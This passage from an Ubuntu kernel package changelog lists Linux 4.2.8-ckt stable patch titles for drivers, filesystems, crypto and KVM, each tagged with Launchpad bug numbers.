\* ALSA: hda - Fix noise on Dell Latitude E6440
- LP: #1536370
\* dm thin: restore requested 'error\_if\_no\_space' setting on OODS to WRITE
transition
- LP: #1536370
\* ALSA: hda - Add fixup for Acer Aspire One Cloudbook 14
- LP: #1536370
\* dm crypt: fix a possible hang due to race condition on exit
- LP: #1536370
\* mac: validate mac\_partition is within sector
- LP: #1536370
\* ALSA: hda - Apply HP headphone fixups more generically
- LP: #1536370
\* blk-mq: fix calling unplug callbacks with preempt disabled
- LP: #1536370
\* ARM: imx: add platform irq type setting in gpc
- LP: #1536370
\* watchdog: omap\_wdt: fix null pointer dereference
- LP: #1536370
\* ARC: dw2 unwind: Remove falllback linear search thru FDE entries
- LP: #1536370
\* dm thin: fix regression in advertised discard limits
- LP: #1536370
\* fix sysvfs symlinks
- LP: #1536370
\* vfs: Make sendfile(2) killable even better
- LP: #1536370
\* vfs: Avoid softlockups with sendfile(2)
- LP: #1536370
\* nfs4: limit callback decoding to received bytes
- LP: #1536370
\* ALSA: hda - Fix headphone noise after Dell XPS 13 resume back from S3
- LP: #1519168, #1536370
\* ARM: dts: vfxxx: Fix dspi[01] spi-num-chipselects.
- LP: #1536370
\* ARM/arm64: KVM: test properly for a PTE's uncachedness
- LP: #1536370
\* arm64: KVM: Fix AArch32 to AArch64 register mapping
- LP: #1536370
\* drm/radeon: make rv770\_set\_sw\_state failures non-fatal
- LP: #1536370
\* PCI: Prevent out of bounds access in numa\_node override
- LP: #1536370
\* ALSA: hda - Fix noise on Gigabyte Z170X mobo
- LP: #1536370
\* ARM: dove: Fix legacy get\_irqnr\_and\_base
- LP: #1536370
\* ARM: orion5x: Fix legacy get\_irqnr\_and\_base
- LP: #1536370
\* drm/radeon: make some dpm errors debug only
- LP: #1536370
\* NFSv4.1/pNFS: Don't request a minimal read layout beyond the end of
file
- LP: #1536370
\* nfs4: resend LAYOUTGET when there is a race that changes the seqid
- LP: #1536370
\* xen/gntdev: Grant maps should not be subject to NUMA balancing
- LP: #1536370
\* iscsi-target: Fix rx\_login\_comp hang after login failure
- LP: #1536370
\* target: Fix race for SCF\_COMPARE\_AND\_WRITE\_POST checking
- LP: #1536370
\* target: fix COMPARE\_AND\_WRITE non zero SGL offset data corruption
- LP: #1536370
\* thermal: fix thermal\_zone\_bind\_cooling\_device prototype
- LP: #1536370
\* ARM: 8454/1: OF implies OF\_FLATTREE
- LP: #1536370
\* ARM: dts: Kirkwood: Fix QNAP TS219 power-off
- LP: #1536370
\* ASoC: rsnd: fixup SCU\_SYS\_INT\_EN1 address
- LP: #1536370
\* Bluetooth: Fix l2cap\_chan leak in SMP
- LP: #1536370
\* crypto: nx - Fix timing leak in GCM and CCM decryption
- LP: #1536370
\* crypto: talitos - Fix timing leak in ESP ICV verification
- LP: #1536370
\* ASoC: wm8962: correct addresses for HPF\_C\_0/1
- LP: #1536370
\* rtlwifi: rtl8821ae: Fix lockups on boot
- LP: #1536370
\* mac80211: mesh: fix call\_rcu() usage
- LP: #1536370
\* advansys: fix big-endian builds
- LP: #1536370
\* mac80211: ensure we don't update tx power on a non-running sdata
- LP: #1536370
\* drm/i915: Mark uneven memory banks on gen4 desktop as unknown swizzling
- LP: #1536370
\* ring-buffer: Update read stamp with first real commit on page
- LP: #1536370
\* drm/i915: Don't override output type for DDI HDMI
- LP: #1536370
\* block: Always check queue limits for cloned requests
- LP: #1536370
\* direct-io: Fix negative return from dio read beyond eof
- LP: #1536370
\* drm/amdgpu: fix userptr flags check
- LP: #1536370
\* virtio-gpu: use no-merge for fill-modes
- LP: #1536370
\* Fix a memory leak in scsi\_host\_dev\_release()
- LP: #1536370
\* wan/x25: Fix use-after-free in x25\_asy\_open\_tty()
- LP: #1536370
\* mac80211: do not actively scan DFS channels
- LP: #1536370
\* PM / Domains: Fix bad of\_node\_put() in failure paths of
genpd\_dev\_pm\_attach()
- LP: #1536370
\* drm: Fix an unwanted master inheritance v2
- LP: #1536370
\* sched/core: Clear the root\_domain cpumasks in init\_rootdomain()
- LP: #1536370
\* ARM/arm64: KVM: correct PTE uncachedness check
- LP: #1536370
\* drm/amdgpu: partially revert "drm/amdgpu: fix
VM\_CONTEXT\*\_PAGE\_TABLE\_END\_ADDR" v2
- LP: #1536370
\* x86/mpx: Fix instruction decoder condition
- LP: #1536370
\* x86/signal: Fix restart\_syscall number for x32 tasks
- LP: #1536370
\* Don't reset ->total\_link\_count on nested calls of vfs\_path\_lookup()
- LP: #1536370
\* net: mvneta: fix bit assignment in MVNETA\_RXQ\_CONFIG\_REG
- LP: #1536370
\* net: mvneta: fix bit assignment for RX packet irq enable
- LP: #1536370
\* net: mvneta: add configuration for MBUS windows access protection
- LP: #1536370
\* iwlwifi: mvm: don't overwrite the key indices in D3 entry
- LP: #1536370
\* mac80211: fix off-channel mgmt-tx uninitialized variable usage
- LP: #1536370
\* drm/rockchip: unset pgoff when mmap'ing gems
- LP: #1536370
\* remoteproc: avoid stack overflow in debugfs file
- LP: #1536370
\* sched/rt: Hide the push\_irq\_work\_func() declaration
- LP: #1536370
\* drm: imx: convert to drm\_crtc\_send\_vblank\_event()
- LP: #1536370
\* sched/wait: Fix signal handling in bit wait helpers
- LP: #1536370
\* ACPI / property: fix compile error for
acpi\_node\_get\_property\_reference() when CONFIG\_ACPI=n
- LP: #1536370
\* ipv4: igmp: Allow removing groups from a removed interface
- LP: #1536370
\* isdn: Partially revert debug format string usage clean up
- LP: #1536370
\* sched/core: Remove false-positive warning from wake\_up\_process()
- LP: #1536370
\* gpio: omap: drop omap1 mpuio specific irq\_mask/unmask callbacks
- LP: #1536370
\* SUNRPC: Fix callback channel
- LP: #1536370
\* cuse: fix memory leak
- LP: #1536370
\* fuse: break infinite loop in fuse\_fill\_write\_pages()
- LP: #1536370
\* usb: gadget: pxa27x: fix suspend callback
- LP: #1536370
\* iio: fix some warning messages
- LP: #1536370
\* iio: adc: spmi-vadc: add missing of\_node\_put
- LP: #1536370
\* USB: cp210x: Remove CP2110 ID from compatibility list
- LP: #1536370
\* USB: cdc\_acm: Ignore Infineon Flash Loader utility
- LP: #1536370
\* USB: serial: Another Infineon flash loader USB ID
- LP: #1536370
\* ext4: Fix handling of extended tv\_sec
- LP: #1536370
\* jbd2: Fix unreclaimed pages after truncate in data=journal mode
- LP: #1536370
\* drm/ttm: Fixed a read/write lock imbalance
- LP: #1536370
\* ext4: fix an endianness bug in ext4\_encrypted\_zeroout()
- LP: #1536370
\* ext4: fix an endianness bug in ext4\_encrypted\_follow\_link()
- LP: #1536370
\* AHCI: Fix softreset failed issue of Port Multiplier
- LP: #1536370
\* sata\_sil: disable trim
- LP: #1536370
\* usb-storage: Fix scsi-sd failure "Invalid field in cdb" for USB adapter
JMicron
- LP: #1536370
\* staging: lustre: echo\_copy..\_lsm() dereferences userland pointers
directly
- LP: #1536370
\* irqchip/versatile-fpga: Fix PCI IRQ mapping on Versatile PB
- LP: #1536370
\* usb: core : hub: Fix BOS 'NULL pointer' kernel panic
- LP: #1536370
\* USB: whci-hcd: add check for dma mapping error
- LP: #1536370
\* usb: Use the USB\_SS\_MULT() macro to decode burst multiplier for log
message
- LP: #1536370
\* dm btree: fix leak of bufio-backed block in btree\_split\_sibling error
path
- LP: #1536370
\* dm thin metadata: fix bug in dm\_thin\_remove\_range()
- LP: #1536370
\* perf: Fix PERF\_EVENT\_IOC\_PERIOD deadlock
- LP: #1536370
\* xhci: Fix memory leak in xhci\_pme\_acpi\_rtd3\_enable()
- LP: #1536370
\* usb: xhci: fix config fail of FS hub behind a HS hub with MTT
- LP: #1536370
\* jbd2: fix null committed data return in undo\_access
- LP: #1536370
\* block: detach bdev inode from its wb in \_\_blkdev\_put()
- LP: #1536370
\* ALSA: rme96: Fix unexpected volume reset after rate changes
- LP: #1536370
\* ALSA: hda - Add inverted dmic for Packard Bell DOTS
- LP: #1523232, #1536370
\* vhost: relax log address alignment
- LP: #1536370
\* virtio: fix memory leak of virtio ida cache layers
- LP: #1536370
\* IB/srp: Fix a memory leak
- LP: #1536370
\* IB/srp: Fix possible send queue overflow
- LP: #1536370
\* powerpc/opal-irqchip: Fix double endian conversion
- LP: #1536370
\* powerpc/opal-irqchip: Fix deadlock introduced by "Fix double endian
conversion"
- LP: #1536370
\* cxl: Set endianess of kernel contexts
- LP: #1536370
\* ALSA: hda - Fixing speaker noise on the two latest thinkpad models
- LP: #1523517, #1536370
\* of/fdt: Add mutex protection for calls to \_\_unflatten\_device\_tree()
- LP: #1536370
\* 9p: ->evict\_inode() should kick out ->i\_data, not ->i\_mapping
- LP: #1536370
\* fix the regression from "direct-io: Fix negative return from dio read
beyond eof"
- LP: #1536370
\* radeon/cik: Fix GFX IB test on Big-Endian
- LP: #1536370
\* radeon: Fix VCE ring test for Big-Endian systems
- LP: #1536370
\* radeon: Fix VCE IB test on Big-Endian systems
- LP: #1536370
\* ALSA: hda - Fix noise problems on Thinkpad T440s
- LP: #1536370
\* ALSA: hda/ca0132 - quirk for Alienware 17 2015
- LP: #1536370
\* dm thin metadata: fix bug when taking a metadata snapshot
- LP: #1536370
\* dm space map metadata: fix ref counting bug when bootstrapping a new
space map
- LP: #1536370
\* ipmi: move timer init to before irq is setup
- LP: #1536370
\* dm btree: fix bufio buffer leaks in dm\_btree\_del() error path
- LP: #1536370
\* vgaarb: fix signal handling in vga\_get()
- LP: #1536370
\* ARM: dts: vf610: use reset values for L2 cache latencies
- LP: #1536370
\* xhci: fix usb2 resume timing and races.
- LP: #1536370
\* USB: add quirk for devices with broken LPM
- LP: #1536370
\* parisc iommu: fix panic due to trying to allocate too large region
- LP: #1536370
\* mm: hugetlb: fix hugepage memory leak caused by wrong reserve count
- LP: #1536370
\* mm, vmstat: allow WQ concurrency to discover memory reclaim doesn't
make any progress
- LP: #1536370
\* mm: hugetlb: call huge\_pte\_alloc() only if ptep is null
- LP: #1536370
\* drivers/base/memory.c: prohibit offlining of memory blocks with missing
sections
- LP: #1536370
\* ocfs2: fix SGID not inherited issue
- LP: #1536370
\* sh64: fix \_\_NR\_fgetxattr
- LP: #1536370
\* sched/wait: Fix the signal handling fix
- LP: #1536370
\* sata/mvebu: use #ifdef around suspend/resume code
- LP: #1536370
\* usb: musb: USB\_TI\_CPPI41\_DMA requires dmaengine support
- LP: #1536370
\* i2c: rk3x: populate correct variable for sda\_falling\_time
- LP: #1536370
\* i2c: mv64xxx: The n clockdiv factor is 0 based on sunxi SoCs
- LP: #1536370
\* xen/events/fifo: Consume unprocessed events when a CPU dies
- LP: #1536370
\* ARM: 8465/1: mm: keep reserved ASIDs in sync with mm after multiple
rollovers
- LP: #1536370
\* net: mvpp2: fix missing DMA region unmap in egress processing
- LP: #1536370
\* net: mvpp2: fix buffers' DMA handling on RX path
- LP: #1536370
\* net: mvpp2: fix refilling BM pools in RX path
- LP: #1536370
\* dmaengine: at\_xdmac: fix macro typo
- LP: #1536370
\* video: fbdev: fsl: Fix kernel crash when diu\_ops is not implemented
- LP: #1536370
\* crypto: skcipher - Copy iv from desc even for 0-len walks
- LP: #1536370
\* ASoC: es8328: Fix deemphasis values
- LP: #1536370
\* KVM: PPC: Book3S HV: Prohibit setting illegal transaction state in MSR
- LP: #1536370
\* dmaengine: at\_xdmac: fix at\_xdmac\_prep\_dma\_memcpy()
- LP: #1536370
\* rfkill: copy the name into the rfkill struct
- LP: #1536370
\* ses: Fix problems with simple enclosures
- LP: #1536370
\* ASoC: davinci-mcasp: Fix XDATA check in mcasp\_start\_tx
- LP: #1536370
\* ses: fix additional element traversal bug
- LP: #1536370
\* powercap / RAPL: fix BIOS lock check
- LP: #1536370
\* ARCv2: intc: Fix random perf irq disabling in SMP setup
- LP: #1536370
\* i2c: designware: reverts "i2c: designware: Add support for AMD I2C
controller"
- LP: #1536370
\* i2c: designware: fix IO timeout issue for AMD controller
- LP: #1536370
\* ASoC: wm8974: set cache type for regmap
- LP: #1536370
\* n\_tty: Fix poll() after buffer-limited eof push read
- LP: #1536370
\* tty: Fix GPF in flush\_to\_ldisc()
- LP: #1536370
\* ALSA: usb-audio: Add a more accurate volume quirk for AudioQuest
DragonFly
- LP: #1536370
\* ALSA: usb-audio: Add sample rate inquiry quirk for AudioQuest DragonFly
- LP: #1536370
\* drm: Don't overwrite UNVERFIED mode status to OK
- LP: #1536370
\* ARM: dts: imx6: Fix Ethernet PHY mode on Ventana boards
- LP: #1536370
\* ARM: 8471/1: need to save/restore arm register(r11) when it is
corrupted
- LP: #1536370
\* ALSA: hda - Fix headphone mic input on a few Dell ALC293 machines
- LP: #1526330, #1536370
\* ALSA: hda - Apply click noise workaround for Thinkpads generically
- LP: #1536370
\* ALSA: hda - Set codec to D3 at reboot/shutdown on Thinkpads
- LP: #1536370
\* ALSA: hda - Add a fixup for Thinkpad X1 Carbon 2nd
- LP: #1536370
\* spi: fix parent-device reference leak
- LP: #1536370
\* scripts: recordmcount: break hardlinks
- LP: #1536370
\* dma-debug: Fix dma\_debug\_entry offset calculation
- LP: #1536370
\* ftrace/scripts: Have recordmcount copy the object file
- LP: #1536370
\* mtd: ubi: fixup error correction in do\_sync\_erase()
- LP: #1536370
\* mtd: ubi: don't leak e if schedule\_erase() fails
- LP: #1536370
\* ARC: dw2 unwind: Reinstante unwinding out of modules
- LP: #1536370
\* ARC: dw2 unwind: Ignore CIE version !=1 gracefully instead of bailing
- LP: #1536370
\* powerpc/powernv: pr\_warn\_once on unsupported OPAL\_MSG type
- LP: #1536370
\* drm/nouveau/bios/fan: hardcode the fan mode to linear
- LP: #1536370
\* md/raid10: fix data corruption and crash during resync
- LP: #1536370
\* ALSA: hda - Set SKL+ hda controller power at freeze() and thaw()
- LP: #1536370
\* s390/dis: Fix handling of format specifiers
- LP: #1536370
\* [media] Revert "[media] ivtv: avoid going past input/audio array"
- LP: #1536370
\* [media] airspy: increase USB control message buffer size
- LP: #1536370
\* USB: ipaq.c: fix a timeout loop
- LP: #1536370
\* USB: fix invalid memory access in hub\_activate()
- LP: #1536370
\* i2c: rcar: disable runtime PM correctly in slave mode
- LP: #1536370
\* md: remove check for MD\_RECOVERY\_NEEDED in action\_store.
- LP: #1536370
\* parisc: Fix syscall restarts
- LP: #1536370
\* ALSA: hda/realtek - Fix silent headphone output on MacPro 4,1 (v2)
- LP: #1536370
\* MIPS: uaccess: Fix strlen\_user with EVA
- LP: #1536370
\* drm/i915: Break busywaiting for requests on pending signals
- LP: #1536370
\* drm/i915: Limit the busy wait on requests to 5us not 10ms!
- LP: #1536370
\* drm/i915: Only spin whilst waiting on the current request
- LP: #1536370
\* MIPS: CPS: drop .set mips64r2 directives
- LP: #1536370
\* KVM: MTRR: fix fixed MTRR segment look up
- LP: #1536370
\* KVM: MTRR: observe maxphyaddr from guest CPUID, not host
- LP: #1536370
\* KVM: MTRR: treat memory as writeback if MTRR is disabled in guest CPUID
- LP: #1536370
\* arm: fix handling of F\_OFD\_... in oabi\_fcntl64()
- LP: #1536370
\* ocfs2: fix BUG when calculate new backup super
- LP: #1536370
\* mm/memory\_hotplug.c: check for missing sections in
test\_pages\_in\_a\_zone()
- LP: #1536370
\* ipv6/addrlabel: fix ip6addrlbl\_get()
- LP: #1536370
\* xfrm: add rcu protection to sk->sk\_policy[]
- LP: #1536370
\* amd-xgbe: fix a couple timeout loops
- LP: #1536370
\* phy: sun9i-usb: add USB dependency
- LP: #1536370
\* sctp: convert sack\_needed and sack\_generation to bits
- LP: #1536370
\* sctp: start t5 timer only when peer rwnd is 0 and local state is
SHUTDOWN\_PENDING
- LP: #1536370
\* serial: 8250\_uniphier: fix dl\_read and dl\_write functions
- LP: #1536370
\* net: fix warnings in 'make htmldocs' by moving macro definition out of
field declaration
- LP: #1536370
\* netfilter: nfnetlink\_queue: Unregister pernet subsys in case of init
failure
- LP: #1536370
\* addrconf: always initialize sysctl table data
- LP: #1536370
\* ser\_gigaset: fix deallocation of platform device structure
- LP: #1536370
\* pinctrl: bcm2835: Fix initial value for direction\_output
- LP: #1536370
\* mISDN: fix a loop count
- LP: #1536370
\* sh\_eth: fix TX buffer byte-swapping
- LP: #1536370
\* qlcnic: fix a timeout loop
- LP: #1536370
\* dmaengine: bcm2835-dma: Convert to use DMA pool
- LP: #1536370
\* net: phy: mdio-mux: Check return value of mdiobus\_alloc()
- LP: #1536370
\* include/linux/mmdebug.h: should include linux/bug.h
- LP: #1536370
\* genirq: Prevent chip buslock deadlock
- LP: #1536370
\* x86/mce: Ensure offline CPUs don't participate in rendezvous process
- LP: #1536370
\* x86/paravirt: Prevent rtc\_cmos platform device init on PV guests
- LP: #1536370
\* ASoC: arizona: Fix bclk for sample rates that are multiple of 4kHz
- LP: #1536370
\* ALSA: hda - Add mic mute hotkey quirk for Lenovo ThinkCentre AIO
- LP: #1536370
\* ALSA: hda - Add keycode map for alc input device
- LP: #1536370
\* ftrace/scripts: Fix incorrect use of sprintf in recordmcount
- LP: #1536370
\* tracing: Fix setting of start\_index in find\_next()
- LP: #1536370
\* tile: provide CONFIG\_PAGE\_SIZE\_64KB etc for tilepro
- LP: #1536370
\* ARM: OMAP2+: Fix onenand rate detection to avoid filesystem corruption
- LP: #1536370
\* ARM: versatile: fix MMC/SD interrupt assignment
- LP: #1536370
\* async\_tx: use GFP\_NOWAIT rather than GFP\_IO
- LP: #1536370
\* dts: vt8500: Add SDHC node to DTS file for WM8650
- LP: #1536370
\* ftrace/module: Call clean up function when module init fails early
- LP: #1536370
\* vmstat: allocate vmstat\_wq before it is used
- LP: #1536370
\* firmware: dmi\_scan: Fix UUID endianness for SMBIOS >= 2.6
- LP: #1536370
\* kvm: x86: only channel 0 of the i8254 is linked to the HPET
- LP: #1536370
\* ASoC: Use nested lock for snd\_soc\_dapm\_mutex\_lock
- LP: #1536370
\* net: sched: fix missing free per cpu on qstats
- LP: #1536370
\* net: filter: make JITs zero A for SKF\_AD\_ALU\_XOR\_X
- LP: #1536370
\* sched/core: Reset task's lockless wake-queues on fork()
- LP: #1536370
\* net: possible use after free in dst\_release
- LP: #1536370
\* Linux 4.2.8-ckt2
- LP: #1536370
\* drivers/base/memory.c: fix kernel warning during memory hotplug on
ppc64
- LP: #1463654
\* xfrm: dst\_entries\_init() per-net dst\_ops
- LP: #1486670
\* powerpc/pseries: Limit EPOW reset event warnings
- LP: #1539102
\* drm/nouveau/nv46: Change mc subdev oclass from nv44 to nv4c
- LP: #1540532
\* ovl: allow zero size xattr
- LP: #1540532
\* ovl: use a minimal buffer in ovl\_copy\_xattr
- LP: #1540532
\* [media] vb2: fix a regression in poll() behavior for output,streams
- LP: #1540532
\* [media] gspca: ov534/topro: prevent a division by 0
- LP: #1540532
\* [media] media: dvb-core: Don't force CAN\_INVERSION\_AUTO in oneshot mode
- LP: #1540532
\* [media] si2157: return -EINVAL if firmware blob is too big
- LP: #1540532
\* tools lib traceevent: Fix output of %llu for 64 bit values read on 32
bit machines
- LP: #1540532
\* cxl: use correct operator when writing pcie config space values
- LP: #1540532
\* KVM: x86: expose MSR\_TSC\_AUX to userspace
- LP: #1540532
\* KVM: x86: correctly print #AC in traces
- LP: #1540532
\* drm/amdgpu: call hpd\_irq\_event on resume
- LP: #1540532
\* drm/radeon: call hpd\_irq\_event on resume
- LP: #1540532
\* xhci: refuse loading if nousb is used
- LP: #1540532
\* ARM: mvebu: remove duplicated regulator definition in Armada 388 GP
- LP: #1540532
\* arm64: Clear out any singlestep state on a ptrace detach operation
- LP: #1540532
\* time: Avoid signed overflow in timekeeping\_get\_ns()
- LP: #1540532
\* ovl: root: copy attr
- LP: #1540532
\* Bluetooth: Add support of Toshiba Broadcom based devices
- LP: #1522949, #1540532
\* ext4 crypto: exit cleanly if ext4\_derive\_key\_aes() fails
- LP: #1540532
\* ext4 crypto: add missing locking for keyring\_key access
- LP: #1540532
\* rtlwifi: fix memory leak for USB device
- LP: #1540532
\* wlcore/wl12xx: spi: fix oops on firmware load
- LP: #1540532
\* ovl: setattr: check permissions before copy-up
- LP: #1540532
\* ovl: check dentry positiveness in ovl\_cleanup\_whiteouts()
- LP: #1540532
\* EDAC, mc\_sysfs: Fix freeing bus' name
- LP: #1540532
\* EDAC: Robustify workqueues destruction
- LP: #1540532
\* arm64: mm: ensure that the zero page is visible to the page table
walker
- LP: #1540532
\* powerpc: Make value-returning atomics fully ordered
- LP: #1540532
\* powerpc: Make {cmp}xchg\* and their atomic\_ versions fully ordered
- LP: #1540532
\* dm space map metadata: remove unused variable in brb\_pop()
- LP: #1540532
\* Drivers: hv: vmbus: Fix a Host signaling bug
- LP: #1540532
\* tools: hv: vss: fix the write()'s argument: error -> vss\_msg
- LP: #1540532
\* clk: exynos: use irqsave version of spin\_lock to avoid deadlock with
irqs
- LP: #1540532
\* iommu/io-pgtable-arm: Ensure we free the final level on teardown
- LP: #1540532
\* dm thin: fix race condition when destroying thin pool workqueue
- LP: #1540532
\* drm/radeon: Fix "slow" audio over DP on DCE8+
- LP: #1540532
\* futex: Drop refcount if requeue\_pi() acquired the rtmutex
- LP: #1540532
\* arm64: mdscr\_el1: avoid exposing DCC to userspace
- LP: #1540532
\* arm64: kernel: enforce pmuserenr\_el0 initialization and restore
- LP: #1540532
\* coresight: checking for NULL string in coresight\_name\_match()
- LP: #1540532
\* drm/radeon: Fix off-by-one errors in radeon\_vm\_bo\_set\_addr
- LP: #1540532
\* drm/amdgpu: Fix off-by-one errors in amdgpu\_vm\_bo\_map
- LP: #1540532
\* drm/radeon: clean up fujitsu quirks
- LP: #1540532
\* mmc: mmc: Fix incorrect use of driver strength switching HS200 and
HS400
- LP: #1540532
\* mmc: sdhci-pci: Do not default to 33 Ohm driver strength for Intel SPT
- LP: #1540532
\* mmc: sdio: Fix invalid vdd in voltage switch power cycle
- LP: #1540532
\* mmc: sdhci: Fix DMA descriptor with zero data length
- LP: #1540532
\* mmc: sdhci: Fix sdhci\_runtime\_pm\_bus\_on/off()
- LP: #1540532
\* regulator: axp20x: Fix GPIO LDO enable value for AXP22x
- LP: #1540532
\* udf: limit the maximum number of indirect extents in a row
- LP: #1540532
\* [media] rc: sunxi-cir: Initialize the spinlock properly
- LP: #1540532
\* nfs: Fix race in \_\_update\_open\_stateid()
- LP: #1540532
\* USB: cp210x: add ID for ELV Marble Sound Board 1
- LP: #1540532
\* Thermal: initialize thermal zone device correctly
- LP: #1540532
\* Thermal: handle thermal zone device properly during system sleep
- LP: #1540532
\* Thermal: do thermal zone update after a cooling device registered
- LP: #1540532
\* posix-clock: Fix return code on the poll method's error path
- LP: #1540532
\* rtlwifi: rtl8723be: Fix module parameter initialization
- LP: #1540532
\* rtlwifi: rtl8723ae: Fix initialization of module parameters
- LP: #1540532
\* rtlwifi: rtl8821ae: Fix errors in parameter initialization
- LP: #1540532
\* rtlwifi: rtl8188ee: Fix module parameter initialization
- LP: #1540532
\* rtlwifi: rtl8192de: Fix incorrect module parameter descriptions
- LP: #1540532
\* rtlwifi: rtl8192se: Fix module parameter initialization
- LP: #1540532
\* rtlwifi: rtl8192ce: Fix handling of module parameters
- LP: #1540532
\* rtlwifi: rtl8192cu: Add missing parameter setup
- LP: #1540532
\* NFS: Fix attribute cache revalidation
- LP: #1540532
\* rtlwifi: rtl\_pci: Fix kernel panic
- LP: #1540532
\* bcache: fix a livelock when we cause a huge number of cache misses
- LP: #1540532
\* bcache: Add a cond\_resched() call to gc
- LP: #1540532
\* bcache: clear BCACHE\_DEV\_UNLINK\_DONE flag when attaching a backing
device
- LP: #1540532
\* bcache: fix a leak in bch\_cached\_dev\_run()
- LP: #1540532
\* bcache: unregister reboot notifier if bcache fails to unregister device
- LP: #1540532
\* bcache: allows use of register in udev to avoid "device\_busy" error.
- LP: #1540532
\* bcache: Change refill\_dirty() to always scan entire disk if necessary
- LP: #1540532
\* wlcore/wl12xx: spi: fix NULL pointer dereference (Oops)
- LP: #1540532
\* Input: i8042 - add Fujitsu Lifebook U745 to the nomux list
- LP: #1540532
\* libxfs: pack the agfl header structure so XFS\_AGFL\_SIZE is correct
- LP: #1540532
\* x86/xen: don't reset vcpu\_info on a cancelled suspend
- LP: #1540532
\* udf: Prevent buffer overrun with multi-byte characters
- LP: #1540532
\* udf: Check output buffer length when converting name to CS0
- LP: #1540532
\* drm/dp/mst: process broadcast messages correctly
- LP: #1540532
\* drm/dp/mst: always send reply for UP request
- LP: #1540532
\* drm/dp/mst: fix in MSTB RAD initialization
- LP: #1540532
\* drm/dp/mst: fix in RAD element access
- LP: #1540532
\* PCI: Fix minimum allocation address overwrite
- LP: #1540532
\* PCI: host: Mark PCIe/PCI (MSI) IRQ cascade handlers as IRQF\_NO\_THREAD
- LP: #1540532
\* btrfs: handle invalid num\_stripes in sys\_array
- LP: #1540532
\* iwlwifi: update and fix 7265 series PCI IDs
- LP: #1540532
\* iwlwifi: pcie: properly configure the debug buffer size for 8000
- LP: #1540532
\* locks: fix unlock when fcntl\_setlk races with a close
- LP: #1540532
\* scsi: add Synology to 1024 sector blacklist
- LP: #1540532
\* ASoC: compress: Fix compress device direction check
- LP: #1540532
\* dm snapshot: fix hung bios when copy error occurs
- LP: #1540532
\* uml: fix hostfs mknod()
- LP: #1540532
\* uml: flush stdout before forking
- LP: #1540532
\* drm/nouveau/kms: take mode\_config mutex in connector hotplug path
- LP: #1540532
\* ALSA: usb: Add native DSD support for Oppo HA-1
- LP: #1540532
\* ALSA: hda - Fixup inverted internal mic for Lenovo E50-80
- LP: #1529624, #1540532
\* x86/mm: Add barriers and document switch\_mm()-vs-flush synchronization
- LP: #1540532
\* x86/boot: Double BOOT\_HEAP\_SIZE to 64KB
- LP: #1540532
\* s390: fix normalization bug in exception table sorting
- LP: #1540532
\* xfs: inode recovery readahead can race with inode buffer creation
- LP: #1540532
\* xfs: handle dquot buffer readahead in log recovery correctly
- LP: #1540532
\* clocksource/drivers/vt8500: Increase the minimum delta
- LP: #1540532
\* Input: elantech - mark protocols v2 and v3 as semi-mt
- LP: #1540532
\* x86/reboot/quirks: Add iMac10,1 to pci\_reboot\_dmi\_table[]
- LP: #1540532
\* ALSA: seq: Fix missing NULL check at remove\_events ioctl
- LP: #1540532
\* ALSA: seq: Fix race at timer setup and close
- LP: #1540532
\* virtio\_balloon: fix race by fill and leak
- LP: #1540532
\* virtio\_balloon: fix race between migration and ballooning
- LP: #1540532
\* ALSA: hda - Fix white noise on Dell Latitude E5550
- LP: #1540532
\* parisc: Fix \_\_ARCH\_SI\_PREAMBLE\_SIZE
- LP: #1540532
\* scripts/recordmcount.pl: support data in text section on powerpc
- LP: #1540532
\* powerpc/module: Handle R\_PPC64\_ENTRY relocations
- LP: #1540532
\* ALSA: hda - fix the headset mic detection problem for a Dell laptop
- LP: #1533461, #1540532
\* ALSA: usb-audio: Fix mixer ctl regression of Native Instrument devices
- LP: #1540532
\* drm/i915: Restore inhibiting the load of the default context
- LP: #1540532
\* drm/i915: intel\_hpd\_init(): Fix suspend/resume reprobing
- LP: #1540532
\* x86/mm: Improve switch\_mm() barrier comments
- LP: #1540532
\* ALSA: timer: Fix double unlink of active\_list
- LP: #1540532
\* dmaengine: dw: fix cyclic transfer setup
- LP: #1540532
\* dmaengine: dw: fix cyclic transfer callbacks
- LP: #1540532
\* mmc: mmci: fix an ages old detection error
- LP: #1540532
\* ALSA: timer: Fix race among timer ioctls
- LP: #1540532
\* sparc64: fix incorrect sign extension in sys\_sparc64\_personality
- LP: #1540532
\* cifs: Ratelimit kernel log messages
- LP: #1540532
\* cifs: fix race between call\_async() and reconnect()
- LP: #1540532
\* cifs\_dbg() outputs an uninitialized buffer in cifs\_readdir()
- LP: #1540532
\* m32r: fix m32104ut\_defconfig build fail
- LP: #1540532
\* dma-debug: switch check from \_text to \_stext
- LP: #1540532
\* scripts/bloat-o-meter: fix python3 syntax error
- LP: #1540532
\* ocfs2/dlm: ignore cleaning the migration mle that is inuse
- LP: #1540532
\* ALSA: hda - Add fixup for Dell Latitidue E6540
- LP: #1540532
\* ALSA: timer: Harden slave timer list handling
- LP: #1540532
\* zram/zcomp: use GFP\_NOIO to allocate streams
- LP: #1540532
\* zram: try vmalloc() after kmalloc()
- LP: #1540532
\* ACPI / video: Add disable\_backlight\_sysfs\_if quirk for the Toshiba
Portege R700
- LP: #1540532
\* ACPI / video: Add disable\_backlight\_sysfs\_if quirk for the Toshiba
Satellite R830
- LP: #1540532
\* mm: soft-offline: check return value in second \_\_get\_any\_page() call
- LP: #1540532
\* zram: don't call idr\_remove() from zram\_remove()
- LP: #1540532
\* memcg: only free spare array when readers are done
- LP: #1540532
\* panic: release stale console lock to always get the logbuf printed out
- LP: #1540532
\* kernel/panic.c: turn off locks debug before releasing console lock
- LP: #1540532
\* printk: do cond\_resched() between lines while outputting to consoles
- LP: #1540532
\* ALSA: hda - Fix bass pin fixup for ASUS N550JX
- LP: #1540532
\* crypto: algif\_skcipher - Require setkey before accept(2)
- LP: #1540532
\* crypto: af\_alg - Disallow bind/setkey/... after accept(2)
- LP: #1540532
\* crypto: af\_alg - Fix socket double-free when accept fails
- LP: #1540532
\* crypto: af\_alg - Add nokey compatibility path
- LP: #1540532
\* crypto: algif\_skcipher - Add nokey compatibility path
- LP: #1540532
\* crypto: hash - Add crypto\_ahash\_has\_setkey
- LP: #1540532
\* crypto: algif\_hash - Require setkey before accept(2)
- LP: #1540532
\* crypto: af\_alg - Allow af\_af\_alg\_release\_parent to be called on nokey
path
- LP: #1540532
\* crypto: algif\_hash - Remove custom release parent function
- LP: #1540532
\* crypto: algif\_skcipher - Remove custom release parent function
- LP: #1540532
\* crypto: af\_alg - Forbid bind(2) when nokey child sockets are present
- LP: #1540532
\* lib: sw842: select crc32
- LP: #1540532
\* crypto: algif\_hash - Fix race condition in hash\_check\_key
- LP: #1540532
\* crypto: algif\_skcipher - Fix race condition in skcipher\_check\_key
